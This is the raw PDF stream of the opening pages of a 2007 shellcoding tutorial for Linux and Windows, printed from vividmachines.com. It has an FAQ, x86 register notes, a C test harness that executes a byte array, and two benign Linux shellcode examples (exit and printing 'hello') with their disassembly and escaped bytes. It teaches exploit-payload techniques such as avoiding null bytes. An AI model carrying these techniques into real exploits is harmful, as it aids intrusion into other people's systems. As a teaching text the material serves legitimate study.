442.574 362.693 l
S
0 0 1 rg
BT
/T1_1 1 Tf
11.673 0 0 11.673 134.4065 363.7641 Tm
(Example 3 - Adding an Administrative Account)Tj
0 0 0 rg
-10.8 -1.343 Td
(        )Tj
ET
64.368 347.017 m
260.475 347.017 l
S
0 0 1 rg
BT
/T1_1 1 Tf
11.673 0 0 11.673 64.3684 348.0889 Tm
(Advanced Shellcoding Methods)Tj
0 0 0 rg
-4.8 -1.343 Td
(                - )Tj
ET
134.407 331.342 m
267.479 331.342 l
S
0 0 1 rg
BT
/T1_1 1 Tf
11.673 0 0 11.673 134.4065 332.4137 Tm
(Printable Shellcode)Tj
0 0 0 rg
-10.8 -1.343 Td
(        )Tj
ET
64.368 315.667 m
134.407 315.667 l
S
0 0 1 rg
BT
/T1_1 1 Tf
11.673 0 0 11.673 64.3684 316.7385 Tm
(Conclusion)Tj
0 0 0 rg
-4.8 -1.343 Td
(        )Tj
ET
64.368 299.992 m
260.475 299.992 l
S
0 0 1 rg
BT
/T1_1 1 Tf
11.673 0 0 11.673 64.3684 301.0633 Tm
(Further Reading/Attributions)Tj
0 0 0 rg
/TT0 1 Tf
16.1626 0 0 16.1626 8.3379 267.792 Tm
(Change Log)Tj
/TT1 1 Tf
11.673 0 0 11.673 8.3379 234.0612 Tm
(1. )Tj
/TT0 1 Tf
(Created)Tj
/TT1 1 Tf
( - )Tj
/TT2 1 Tf
(July 2004)Tj
/T1_0 1 Tf
( )Tj
/TT1 1 Tf
0 -1.385 TD
(2. )Tj
/TT0 1 Tf
(Advanced Shellcoding Methods Section Added)Tj
/TT1 1 Tf
( - )Tj
/TT2 1 Tf
(Sept 2005)Tj
/T1_0 1 Tf
( )Tj
/TT0 1 Tf
16.1626 0 0 16.1626 8.3379 184.3858 Tm
(Frequently Asked Questions)Tj
/TT1 1 Tf
11.673 0 0 11.673 8.3379 152.4365 Tm
(1. )Tj
/TT0 1 Tf
(What is shellcoding?)Tj
/TT1 1 Tf
0 -2.557 TD
(    Shellcoding in its most literal sense, means writing code that will \return a )Tj
0 -1.2 TD
(remote shell when executed. The meaning of shellcode has evolved, it now\ represents )Tj
0 -1.2 TD
(any byte code that will be inserted into an exploit to accomplish a desi\red task. )Tj
0 -2.589 TD
(2. )Tj
/TT0 1 Tf
(There are tons of shellcode repositories all around the internet, why sh\ould I )Tj
0 -1.232 TD
(write my own?)Tj
ET
EMC 
/Artifact <</Attached [/Bottom ]/Type /Pagination /BBox [18 6.4959 582 14 ]>>BDC 
Q
BT
/T1_0 1 Tf
7.5041 0 0 7.5041 18 8.3052 Tm
(http://vividmachines.com/shellcode/shellcode.html \(1 of 21\)3/27/2007 7\:53:51 AM)Tj
ET
EMC 

endstreamendobj146 0 obj<</Length 4535>>stream
/Artifact <</Attached [/Top ]/Type /Pagination /BBox [18 779.4959 582 787 ]>>BDC 
0 0 0 rg
0 i 
BT
/T1_0 1 Tf
0 Tc 0 Tw 0  Ts 100  Tz 0 Tr 7.5041 0 0 7.5041 18 781.3052 Tm
(Shellcoding for Linux and Windows Tutorial)Tj
ET
EMC 
/Article <</MCID 0 >>BDC 
q
0 18 612 756 re
W* n
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 754.8119 Tm
(    Yes, you are correct, there are tons of repositories all around the \internet for )Tj
0 -1.2 TD
(shellcoding. Namely, the )Tj
ET
0 0 1 RG
0.56 w 10 M 0 j 0 J []0 d 
183.433 739.123 m
309.502 739.123 l
S
0 0 1 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 183.4332 740.8042 Tm
(metasploit project)Tj
0 0 0 rg
( seems to be the best. Writing an exploit )Tj
-15 -1.343 Td
(can be difficult, what happens when all of the prewritten blocks of code\ cease to )Tj
0 -1.2 TD
(work? You need to write your own! Hopefully this tutorial will give you \a good head )Tj
T*
(start. )Tj
0 -2.589 TD
(3. )Tj
/TT1 1 Tf
(What do I need to know before I begin?)Tj
/TT0 1 Tf
0 -2.557 TD
(    A decent understanding of x86 assembly, C, and knowledge of the Linu\x and )Tj
0 -1.2 TD
(Windows operating systems. )Tj
0 -2.589 TD
(4. )Tj
/TT1 1 Tf
(What are the differences between windows shellcode and Linux shellcode?)Tj
/TT0 1 Tf
0 -2.557 TD
(     Linux, unlike windows, provides a direct way to interface with the \kernel )Tj
0 -1.232 TD
(through the )Tj
/TT1 1 Tf
(int 0x80)Tj
/TT0 1 Tf
( interface. A complete listing of the Linux syscall table can be )Tj
0 -1.2 TD
(found )Tj
ET
50.361 532.888 m
78.376 532.888 l
S
0 0 1 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 50.3608 534.5691 Tm
(here)Tj
0 0 0 rg
(. Windows on the other hand, does not have a direct kernel interface. Th\e )Tj
-3.6 -1.343 Td
(system must be interfaced by loading the address of the function that ne\eds to be )Tj
0 -1.2 TD
(executed from a DLL \(Dynamic Link Library\). The key difference between\ the two is )Tj
T*
(the fact that the address of the functions found in windows will vary fr\om OS )Tj
0 -1.232 TD
(version to OS version while the )Tj
/TT1 1 Tf
(int 0x80)Tj
/TT0 1 Tf
( syscall numbers will remain constant. )Tj
0 -1.2 TD
(Windows programmers did this so that they could make any change needed t\o the kernel )Tj
T*
(without any hassle; Linux on the contrary has fixed numbering system for\ all kernel )Tj
T*
(level functions, and if they were to change, there would be a million an\gry )Tj
0 -1.2 TD
(programmers \(and a lot of broken code\). )Tj
0 -2.589 TD
(5. )Tj
/TT1 1 Tf
(So, what about windows? How do I find the addresses of my needed DLL fun\ctions? )Tj
0 -1.232 TD
(Don't these addresses change with every service pack upgrade?)Tj
/TT0 1 Tf
0 -2.525 TD
(     There are multitudes of ways to find the addresses of the functions\ that you )Tj
0 -1.2 TD
(need to use in your shellcode. There are two methods for addressing func\tions; you )Tj
T*
(can find the desired function at runtime or use hard coded addresses. Th\is tutorial )Tj
0 -1.385 TD
(will )Tj
/TT2 1 Tf
(mostly)Tj
/TT0 1 Tf
( discuss the hard coded method. The only DLL that is guaranteed to be )Tj
0 -1.2 TD
(mapped into the shellcode's address space is kernel32.dll. This DLL will\ hold )Tj
T*
(LoadLibrary and GetProcAddress, the two functions needed to obtain any f\unctions )Tj
T*
(address that can be mapped into the exploits process space. There is a p\roblem with )Tj
T*
(this method though, the address offsets will change with every new relea\se of )Tj
T*
(Windows \(service packs, patches etc.\). So, if you use this method your\ shellcode )Tj
T*
(will ONLY work for a specific version of Windows. Further dynamic addres\sing will be )Tj
T*
(referenced at the end of the paper in the Further Reading section.)Tj
0 -2.589 TD
(6. )Tj
/TT1 1 Tf
(What's the hype with making sure the shellcode won't have any NULL bytes\ in it? )Tj
0 -1.232 TD
(Normal programs have lots of NULL bytes!)Tj
/TT0 1 Tf
0 -2.525 TD
(    Well this isn't a normal program! The main problem arises in the fac\t that when )Tj
0 -1.2 TD
(the exploit is inserted it will be a string. As we all know, strings are\ terminated )Tj
T*
(with a NULL byte \(C style strings anyhow\). If we have a NULL byte in o\ur shellcode )Tj
T*
(things won't work correctly. )Tj
0 -2.589 TD
(7. )Tj
/TT1 1 Tf
(Why does my shellcode program crash when I run it?)Tj
ET
EMC 
/Artifact <</Attached [/Bottom ]/Type /Pagination /BBox [18 6.4959 582 14 ]>>BDC 
Q
BT
/T1_0 1 Tf
7.5041 0 0 7.5041 18 8.3052 Tm
(http://vividmachines.com/shellcode/shellcode.html \(2 of 21\)3/27/2007 7\:53:51 AM)Tj
ET
EMC 

endstreamendobj147 0 obj<</Length 4611>>stream
/Artifact <</Attached [/Top ]/Type /Pagination /BBox [18 779.4959 582 787 ]>>BDC 
0 0 0 rg
0 i 
BT
/T1_0 1 Tf
0 Tc 0 Tw 0  Ts 100  Tz 0 Tr 7.5041 0 0 7.5041 18 781.3052 Tm
(Shellcoding for Linux and Windows Tutorial)Tj
ET
EMC 
/Article <</MCID 0 >>BDC 
q
0 18 612 756 re
W* n
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 759.1558 Tm
(    Well, in most shellcode the assembly contained within has some sort \of self )Tj
0 -1.2 TD
(modifying qualities. Since we are working in protected mode operating sy\stems the .)Tj
T*
(code segment of the executable image is read only. That is why the shell\ program )Tj
0 -1.2 TD
(needs to copy itself to the stack before attempting execution.)Tj
0 -2.589 TD
(8. )Tj
/TT1 1 Tf
(Can I contact you?)Tj
/TT0 1 Tf
0 -2.557 TD
(    Sure, just email )Tj
ET
0 0 1 RG
0.56 w 10 M 0 j 0 J []0 d 
155.418 655.378 m
260.475 655.378 l
S
0 0 1 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 155.418 657.0593 Tm
(shanna@uiuc.edu)Tj
0 0 0 rg
(. Feel free to ask questions, comments, or )Tj
-12.6 -1.343 Td
(correct something that is wrong in this tutorial.)Tj
0 -2.589 TD
(9. )Tj
/TT1 1 Tf
(Why did you use intel syntax, UGHHH?!)Tj
/TT0 1 Tf
0 -2.557 TD
(    I don't know! I honestly prefer at&t syntax, but for some reason I f\elt )Tj
0 -1.2 TD
(compelled to do this in intel syntax. I am really sorry!)Tj
/T1_0 1 Tf
0 -2.716 TD
( )Tj
/TT1 1 Tf
16.1626 0 0 16.1626 8.3379 503.9413 Tm
(Background Information)Tj
/T1_1 1 Tf
5.8365 0 0 5.8365 29.7771 472.3665 Tm
(l)Tj
/T1_0 1 Tf
(     )Tj
/TT0 1 Tf
11.673 0 0 11.673 41.6894 472.3665 Tm
(EAX, EBX, ECX, and EDX are all 32-bit General Purpose Registers on the x\86 )Tj
0 -1.359 TD
(platform.)Tj
/T1_0 1 Tf
( )Tj
/T1_1 1 Tf
5.8365 0 0 5.8365 29.7771 440.6473 Tm
(l)Tj
/T1_0 1 Tf
(     )Tj
/TT0 1 Tf
11.673 0 0 11.673 41.6894 440.6473 Tm
(AX, BX, CX, and DX access the lower 16-bits of the GPRs.)Tj
/T1_0 1 Tf
( )Tj
/T1_1 1 Tf
5.8365 0 0 5.8365 29.7771 424.7877 Tm
(l)Tj
/T1_0 1 Tf
(     )Tj
/TT0 1 Tf
11.673 0 0 11.673 41.6894 424.7877 Tm
(AL, BL, CL, and DL access the lower 8-bits of the GPRs.)Tj
/T1_0 1 Tf
( )Tj
/T1_1 1 Tf
5.8365 0 0 5.8365 29.7771 410.7801 Tm
(l)Tj
/T1_0 1 Tf
(     )Tj
/TT0 1 Tf
11.673 0 0 11.673 41.6894 410.7801 Tm
(Note: There is no way to reference the top half/fourth of the register w\ithout )Tj
T*
(doing a move, then a shift left.)Tj
/T1_0 1 Tf
( )Tj
/T1_1 1 Tf
5.8365 0 0 5.8365 29.7771 379.0609 Tm
(l)Tj
/T1_0 1 Tf
(     )Tj
/TT0 1 Tf
11.673 0 0 11.673 41.6894 379.0609 Tm
(ESI and EDI are used when making Linux syscalls.)Tj
/T1_0 1 Tf
( )Tj
/T1_1 1 Tf
5.8365 0 0 5.8365 29.7771 363.2013 Tm
(l)Tj
/T1_0 1 Tf
(     )Tj
/TT0 1 Tf
11.673 0 0 11.673 41.6894 363.2013 Tm
(Syscalls with 6 arguments or less are passed via the GPRs.)Tj
/T1_0 1 Tf
( )Tj
/T1_1 1 Tf
5.8365 0 0 5.8365 29.7771 349.1936 Tm
(l)Tj
/T1_0 1 Tf
(     )Tj
/TT0 1 Tf
11.673 0 0 11.673 41.6894 349.1936 Tm
(XOR EAX, EAX is a great way to zero out a register \(while staying away \from the )Tj
T*
(nefarious NULL byte!\))Tj
/T1_0 1 Tf
( )Tj
/T1_1 1 Tf
5.8365 0 0 5.8365 29.7771 319.3264 Tm
(l)Tj
/T1_0 1 Tf
(     )Tj
/TT0 1 Tf
11.673 0 0 11.673 41.6894 319.3264 Tm
(In Windows, all function arguments are passed on the stack according to \their )Tj
0 -1.2 TD
(calling convention.)Tj
/T1_0 1 Tf
-2.857 -2.716 Td
( )Tj
/TT1 1 Tf
16.1626 0 0 16.1626 8.3379 241.9573 Tm
(Required Tools)Tj
/T1_1 1 Tf
5.8365 0 0 5.8365 29.7771 208.5305 Tm
(l)Tj
/T1_0 1 Tf
(     )Tj
/TT0 1 Tf
11.673 0 0 11.673 41.6894 208.5305 Tm
(gcc)Tj
/T1_0 1 Tf
( )Tj
/T1_1 1 Tf
5.8365 0 0 5.8365 29.7771 192.6709 Tm
(l)Tj
/T1_0 1 Tf
(     )Tj
/TT0 1 Tf
11.673 0 0 11.673 41.6894 192.6709 Tm
(ld)Tj
/T1_0 1 Tf
( )Tj
/T1_1 1 Tf
5.8365 0 0 5.8365 29.7771 176.8113 Tm
(l)Tj
/T1_0 1 Tf
(     )Tj
/TT0 1 Tf
11.673 0 0 11.673 41.6894 176.8113 Tm
(nasm)Tj
/T1_0 1 Tf
( )Tj
/T1_1 1 Tf
5.8365 0 0 5.8365 29.7771 162.8037 Tm
(l)Tj
/T1_0 1 Tf
(     )Tj
/TT0 1 Tf
11.673 0 0 11.673 41.6894 162.8037 Tm
(objdump)Tj
/T1_0 1 Tf
-2.857 -2.716 Td
( )Tj
/TT1 1 Tf
16.1626 0 0 16.1626 8.3379 99.4422 Tm
(Optional Tools)Tj
/T1_1 1 Tf
5.8365 0 0 5.8365 29.7771 67.8673 Tm
(l)Tj
/T1_0 1 Tf
(     )Tj
ET
41.689 66.186 m
104.724 66.186 l
S
0 0 1 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 41.6894 67.8673 Tm
(odfhex.c )Tj
0 0 0 rg
(- a utility created by me to extract the shellcode from "objdump -d" )Tj
0 -1.502 TD
(and turn it into escaped hex code \(very useful!\).)Tj
/T1_0 1 Tf
( )Tj
ET
EMC 
/Artifact <</Attached [/Bottom ]/Type /Pagination /BBox [18 6.4959 582 14 ]>>BDC 
Q
BT
/T1_0 1 Tf
7.5041 0 0 7.5041 18 8.3052 Tm
(http://vividmachines.com/shellcode/shellcode.html \(3 of 21\)3/27/2007 7\:53:51 AM)Tj
ET
EMC 

endstreamendobj148 0 obj<</Length 4864>>stream
/Artifact <</Attached [/Top ]/Type /Pagination /BBox [18 779.4959 582 787 ]>>BDC 
0 0 0 rg
0 i 
BT
/T1_0 1 Tf
0 Tc 0 Tw 0  Ts 100  Tz 0 Tr 7.5041 0 0 7.5041 18 781.3052 Tm
(Shellcoding for Linux and Windows Tutorial)Tj
ET
EMC 
/Article <</MCID 0 >>BDC 
q
0 18 612 756 re
W* n
BT
/T1_1 1 Tf
5.8365 0 0 5.8365 29.7771 759.1558 Tm
(l)Tj
/T1_0 1 Tf
(     )Tj
ET
0 0 1 RG
0.56 w 10 M 0 j 0 J []0 d 
41.689 757.475 m
90.716 757.475 l
S
0 0 1 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 41.6894 759.1558 Tm
(arwin.c)Tj
0 0 0 rg
( - a utility created by me to find the absolute addresses of windows )Tj
0 -1.502 TD
(functions within a specified DLL.)Tj
/T1_0 1 Tf
( )Tj
/T1_1 1 Tf
5.8365 0 0 5.8365 29.7771 727.621 Tm
(l)Tj
/T1_0 1 Tf
(     )Tj
ET
41.689 725.94 m
146.747 725.94 l
S
0 0 1 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 41.6894 727.621 Tm
(shellcodetest.c)Tj
0 0 0 rg
( - this is just a copy of the c code found  below. it is a small )Tj
T*
(skeleton program to test shellcode.)Tj
/T1_0 1 Tf
( )Tj
/T1_1 1 Tf
5.8365 0 0 5.8365 29.7771 696.0862 Tm
(l)Tj
/T1_0 1 Tf
(     )Tj
ET
41.689 694.405 m
97.72 694.405 l
S
0 0 1 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 41.6894 696.0862 Tm
(exit.asm)Tj
0 0 0 rg
( )Tj
ET
104.724 694.405 m
167.758 694.405 l
S
0 0 1 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 104.7237 696.0862 Tm
(hello.asm)Tj
0 0 0 rg
( )Tj
ET
174.762 694.405 m
251.804 694.405 l
S
0 0 1 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 174.7619 696.0862 Tm
(msgbox.asm )Tj
ET
251.804 694.405 m
328.846 694.405 l
S
BT
/TT0 1 Tf
11.673 0 0 11.673 251.8038 696.0862 Tm
(shellex.asm)Tj
0 0 0 rg
( )Tj
ET
335.85 694.405 m
398.884 694.405 l
S
0 0 1 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 335.8496 696.0862 Tm
(sleep.asm)Tj
0 0 0 rg
( )Tj
ET
405.888 694.405 m
482.93 694.405 l
S
0 0 1 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 405.8877 696.0862 Tm
(adduser.asm)Tj
0 0 0 rg
( - the source )Tj
-31.2 -1.343 Td
(code found in this document \(the win32 shellcode was written with Windo\ws XP )Tj
0 -1.359 TD
(SP1\).)Tj
/T1_0 1 Tf
( )Tj
/T1_1 1 Tf
5.8365 0 0 5.8365 29.7771 648.6918 Tm
(l)Tj
/T1_0 1 Tf
(     )Tj
11.673 0 0 11.673 41.6894 648.6918 Tm
( )Tj
/TT1 1 Tf
16.1626 0 0 16.1626 8.3379 617.0319 Tm
(Linux Shellcoding)Tj
/TT0 1 Tf
11.673 0 0 11.673 8.3379 585.4571 Tm
(When testing shellcode, it is nice to just plop it into a program and le\t it run. )Tj
0 -1.2 TD
(The C program below will be used to test all of our code. )Tj
ET
0.5 0.5 0.5 rg
8.338 542.27 m
8.338 543.937 l
603.662 543.937 l
602.828 543.103 l
9.172 543.103 l
9.172 543.103 l
h
f
0.875 0.875 0.875 rg
603.662 543.937 m
603.662 542.27 l
8.338 542.27 l
9.172 543.103 l
602.828 543.103 l
602.828 543.103 l
h
f
0 0 0 rg
BT
/TT2 1 Tf
10.7751 0 0 10.7751 8.3379 526.8979 Tm
(/*shellcodetest.c*/)Tj
/TT0 1 Tf
( )Tj
0 -2.67 TD
(char code[] = "bytecode will go here!";)Tj
0 -1.2 TD
(int main\(int argc, char **argv\))Tj
T*
({)Tj
T*
(  int \(*func\)\(\);)Tj
T*
(  func = \(int \(*\)\(\)\) code;)Tj
0 -1.2 TD
(  \(int\)\(*func\)\(\);)Tj
T*
(})Tj
ET
0.5 0.5 0.5 rg
8.338 391.814 m
8.338 393.482 l
603.662 393.482 l
602.828 392.648 l
9.172 392.648 l
9.172 392.648 l
h
f
0.875 0.875 0.875 rg
603.662 393.482 m
603.662 391.814 l
8.338 391.814 l
9.172 392.648 l
602.828 392.648 l
602.828 392.648 l
h
f
0 0 0 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 378.971 Tm
( )Tj
/TT1 1 Tf
0 -1.489 TD
(Example 1 - Making a Quick Exit)Tj
/TT0 1 Tf
0 -2.525 TD
(    The easiest way to begin would be to demonstrate the exit syscall du\e to it's )Tj
0 -1.2 TD
(simplicity. Here is some simple asm code to call exit. Notice the al and\ XOR trick )Tj
T*
(to ensure that no NULL bytes will get into our code. )Tj
ET
0.5 0.5 0.5 rg
8.338 274.917 m
8.338 276.585 l
603.662 276.585 l
602.828 275.751 l
9.172 275.751 l
9.172 275.751 l
h
f
0.875 0.875 0.875 rg
603.662 276.585 m
603.662 274.917 l
8.338 274.917 l
9.172 275.751 l
602.828 275.751 l
602.828 275.751 l
h
f
0 0 0 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 242.9088 Tm
(;)Tj
/TT2 1 Tf
(exit.asm)Tj
/TT0 1 Tf
0 -1.2 TD
([SECTION .text])Tj
T*
(global _start)Tj
0 -1.2 TD
(_start:)Tj
0 -1.2 TD
(        xor eax, eax       ;exit is syscall 1)Tj
T*
(        mov al, 1       ;exit is syscall 1)Tj
T*
(        xor ebx,ebx     ;zero out ebx)Tj
T*
(        int 0x80)Tj
ET
0.5 0.5 0.5 rg
8.338 87.66 m
8.338 89.328 l
603.662 89.328 l
602.828 88.494 l
9.172 88.494 l
9.172 88.494 l
h
f
0.875 0.875 0.875 rg
603.662 89.328 m
603.662 87.66 l
8.338 87.66 l
9.172 88.494 l
602.828 88.494 l
602.828 88.494 l
h
f
0 0 0 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 57.808 Tm
(Take the following steps to compile and extract the byte code.)Tj
0 -1.232 TD
(steve hanna@1337b0x:~$ )Tj
/TT1 1 Tf
(nasm -f elf exit.asm)Tj
ET
EMC 
/Artifact <</Attached [/Bottom ]/Type /Pagination /BBox [18 6.4959 582 14 ]>>BDC 
Q
BT
/T1_0 1 Tf
7.5041 0 0 7.5041 18 8.3052 Tm
(http://vividmachines.com/shellcode/shellcode.html \(4 of 21\)3/27/2007 7\:53:51 AM)Tj
ET
EMC 

endstreamendobj149 0 obj<</Length 2915>>stream
/Artifact <</Attached [/Top ]/Type /Pagination /BBox [18 779.4959 582 787 ]>>BDC 
0 0 0 rg
0 i 
BT
/T1_0 1 Tf
0 Tc 0 Tw 0  Ts 100  Tz 0 Tr 7.5041 0 0 7.5041 18 781.3052 Tm
(Shellcoding for Linux and Windows Tutorial)Tj
ET
EMC 
/Article <</MCID 0 >>BDC 
q
0 18 612 756 re
W* n
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 758.7814 Tm
(steve hanna@1337b0x:~$ )Tj
/TT1 1 Tf
(ld -o exiter exit.o)Tj
/TT0 1 Tf
0 -1.232 TD
(steve hanna@1337b0x:~$ )Tj
/TT1 1 Tf
(objdump -d exiter)Tj
/TT0 1 Tf
0 -2.4 TD
(exiter:     file format elf32-i386)Tj
0 -2.4 TD
(Disassembly of section .text:)Tj
T*
(08048080 <_start>:)Tj
0 -1.232 TD
( 8048080:       )Tj
/TT1 1 Tf
(b0 01)Tj
/TT0 1 Tf
(                   mov    $0x1,%al)Tj
T*
( 8048082:       )Tj
/TT1 1 Tf
(31 db)Tj
/TT0 1 Tf
(                   xor    %ebx,%ebx)Tj
T*
( 8048084:       )Tj
/TT1 1 Tf
(cd 80)Tj
/TT0 1 Tf
(                   int    $0x80)Tj
0 -2.716 TD
(The bytes we need are )Tj
/TT1 1 Tf
(b0 01 31 db cd 80)Tj
/TT0 1 Tf
(.)Tj
/T1_0 1 Tf
( )Tj
/TT0 1 Tf
0 -2.557 TD
(Replace the code at the top with:)Tj
/TT1 1 Tf
( )Tj
0 -1.232 TD
(char code[] = "\\xb0\\x01\\x31\\xdb\\xcd\\x80";)Tj
/TT0 1 Tf
( )Tj
0 -2.557 TD
(Now, run the program. We have a successful piece of shellcode! One can s\trace the )Tj
0 -1.2 TD
(program to ensure that it is calling exit. )Tj
/TT1 1 Tf
0 -2.589 TD
(Example 2 - Saying Hello)Tj
/TT0 1 Tf
0 -2.525 TD
(For this next piece, let's ease our way into something useful. In this b\lock of code )Tj
0 -1.2 TD
(one will find an example on how to load the address of a string in a pie\ce of our )Tj
T*
(code at runtime. This is important because while running shellcode in an\ unknown )Tj
T*
(environment, the address of the string will be unknown because the progr\am is not )Tj
T*
(running in its normal address space. )Tj
ET
0.5 0.5 0.5 rg
8.338 352.507 m
8.338 354.175 l
603.662 354.175 l
602.828 353.341 l
9.172 353.341 l
9.172 353.341 l
h
f
0.875 0.875 0.875 rg
603.662 354.175 m
603.662 352.507 l
8.338 352.507 l
9.172 353.341 l
602.828 353.341 l
602.828 353.341 l
h
f
0 0 0 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 320.4989 Tm
(;)Tj
/TT2 1 Tf
(hello.asm)Tj
/TT0 1 Tf
0 -1.2 TD
([SECTION .text])Tj
0 -2.4 TD
(global _start)Tj
0 -3.6 TD
(_start:)Tj
0 -2.4 TD
(        jmp short ender)Tj
T*
(        starter:)Tj
T*
(        xor eax, eax    ;clean up the registers)Tj
0 -1.2 TD
(        xor ebx, ebx)Tj
0 -1.2 TD
(        xor edx, edx)Tj
0 -1.2 TD
(        xor ecx, ecx)Tj
0 -2.4 TD
(        mov al, 4       ;syscall write)Tj
0 -1.2 TD
(        mov bl, 1       ;stdout is 1)Tj
T*
(        pop ecx         ;get the address of the string from the stack)Tj
T*
(        mov dl, 5       ;length of the string)Tj
ET
EMC 
/Artifact <</Attached [/Bottom ]/Type /Pagination /BBox [18 6.4959 582 14 ]>>BDC 
Q
BT
/T1_0 1 Tf
7.5041 0 0 7.5041 18 8.3052 Tm
(http://vividmachines.com/shellcode/shellcode.html \(5 of 21\)3/27/2007 7\:53:51 AM)Tj
ET
EMC 

endstreamendobj150 0 obj<</Length 3448>>stream
/Artifact <</Attached [/Top ]/Type /Pagination /BBox [18 779.4959 582 787 ]>>BDC 
0 0 0 rg
0 i 
BT
/T1_0 1 Tf
0 Tc 0 Tw 0  Ts 100  Tz 0 Tr 7.5041 0 0 7.5041 18 781.3052 Tm
(Shellcoding for Linux and Windows Tutorial)Tj
ET
EMC 
/Article <</MCID 0 >>BDC 
q
0 18 612 756 re
W* n
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 759.1558 Tm
(        int 0x80)Tj
0 -2.4 TD
(        xor eax, eax)Tj
0 -1.2 TD
(        mov al, 1       ;exit the shellcode)Tj
0 -1.2 TD
(        xor ebx,ebx)Tj
T*
(        int 0x80)Tj
0 -2.4 TD
(        ender:)Tj
0 -1.2 TD
(        call starter    ;put the address of the string on the stack)Tj
T*
(        db 'hello')Tj
ET
0.5 0.5 0.5 rg
8.338 589.9 m
8.338 591.567 l
603.662 591.567 l
602.828 590.734 l
9.172 590.734 l
9.172 590.734 l
h
f
0.875 0.875 0.875 rg
603.662 591.567 m
603.662 589.9 l
8.338 589.9 l
9.172 590.734 l
602.828 590.734 l
602.828 590.734 l
h
f
0 0 0 rg
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 577.0567 Tm
( )Tj
0 -1.489 TD
(steve hanna@1337b0x:~$ )Tj
/TT1 1 Tf
(nasm -f elf hello.asm)Tj
/TT0 1 Tf
0 -1.232 TD
(steve hanna@1337b0x:~$ )Tj
/TT1 1 Tf
(ld -o hello hello.o)Tj
/TT0 1 Tf
T*
(steve hanna@1337b0x:~$ )Tj
/TT1 1 Tf
(objdump -d hello)Tj
/TT0 1 Tf
0 -2.4 TD
(hello:     file format elf32-i386)Tj
0 -2.4 TD
(Disassembly of section .text:)Tj
T*
(08048080 <_start>:)Tj
0 -1.232 TD
( 8048080:       )Tj
/TT1 1 Tf
(eb 19)Tj
/TT0 1 Tf
(                   jmp    804809b )Tj
0 -2.4 TD
(08048082 <starter>:)Tj
0 -1.232 TD
( 8048082:       )Tj
/TT1 1 Tf
(31 c0)Tj
/TT0 1 Tf
(                   xor    %eax,%eax)Tj
T*
( 8048084:       )Tj
/TT1 1 Tf
(31 db)Tj
/TT0 1 Tf
(                   xor    %ebx,%ebx)Tj
T*
( 8048086:       )Tj
/TT1 1 Tf
(31 d2)Tj
/TT0 1 Tf
(                   xor    %edx,%edx)Tj
T*
( 8048088:       )Tj
/TT1 1 Tf
(31 c9)Tj
/TT0 1 Tf
(                   xor    %ecx,%ecx)Tj
T*
( 804808a:       )Tj
/TT1 1 Tf
(b0 04)Tj
/TT0 1 Tf
(                   mov    $0x4,%al)Tj
T*
( 804808c:       )Tj
/TT1 1 Tf
(b3 01)Tj
/TT0 1 Tf
(                   mov    $0x1,%bl)Tj
T*
( 804808e:       )Tj
/TT1 1 Tf
(59)Tj
/TT0 1 Tf
(                      pop    %ecx)Tj
T*
( 804808f:       )Tj
/TT1 1 Tf
(b2 05)Tj
/TT0 1 Tf
(                   mov    $0x5,%dl)Tj
T*
( 8048091:       )Tj
/TT1 1 Tf
(cd 80)Tj
/TT0 1 Tf
(                   int    $0x80)Tj
T*
( 8048093:       )Tj
/TT1 1 Tf
(31 c0)Tj
/TT0 1 Tf
(                   xor    %eax,%eax)Tj
T*
( 8048095:       )Tj
/TT1 1 Tf
(b0 01)Tj
/TT0 1 Tf
(                   mov    $0x1,%al)Tj
T*
( 8048097:       )Tj
/TT1 1 Tf
(31 db)Tj
/TT0 1 Tf
(                   xor    %ebx,%ebx)Tj
T*
( 8048099:       )Tj
/TT1 1 Tf
(cd 80)Tj
/TT0 1 Tf
(                   int    $0x80)Tj
0 -2.4 TD
(0804809b <ender>:)Tj
0 -1.232 TD
( 804809b:       )Tj
/TT1 1 Tf
(e8 e2 ff ff ff)Tj
/TT0 1 Tf
(          call   8048082 )Tj
T*
( 80480a0:       )Tj
/TT1 1 Tf
(68 65 6c 6c 6f)Tj
/TT0 1 Tf
(          push   $0x6f6c6c65)Tj
0 -3.6 TD
(Replace the code at the top with:)Tj
/TT1 1 Tf
0 -1.232 TD
(char code[] = "\\xeb\\x19\\x31\\xc0\\x31\\xdb\\x31\\xd2\\x31\\xc9\\xb0\\\x04\\xb3\\x01\\x59\\xb2\\x05)Tj
0 -1.2 TD
(\\xcd"\\)Tj
T*
(              "\\x80\\x31\\xc0\\xb0\\x01\\x31\\xdb\\xcd\\x80\\xe8\\xe2\\\xff\\xff\\xff\\x68\\x65\\x6c)Tj
T*
(\\x6c\\x6f";)Tj
ET
EMC 
/Artifact <</Attached [/Bottom ]/Type /Pagination /BBox [18 6.4959 582 14 ]>>BDC 
Q
BT
/T1_0 1 Tf
7.5041 0 0 7.5041 18 8.3052 Tm
(http://vividmachines.com/shellcode/shellcode.html \(6 of 21\)3/27/2007 7\:53:51 AM)Tj
ET
EMC 

endstreamendobj151 0 obj<</Length 3251>>stream
/Artifact <</Attached [/Top ]/Type /Pagination /BBox [18 779.4959 582 787 ]>>BDC 
0 0 0 rg
0 i 
BT
/T1_0 1 Tf
0 Tc 0 Tw 0  Ts 100  Tz 0 Tr 7.5041 0 0 7.5041 18 781.3052 Tm
(Shellcoding for Linux and Windows Tutorial)Tj
ET
EMC 
/Article <</MCID 0 >>BDC 
q
0 18 612 756 re
W* n
BT
/TT0 1 Tf
11.673 0 0 11.673 8.3379 759.1558 Tm
(At this point we have a fully functional piece of shellcode that outputs\ to stdout.)Tj
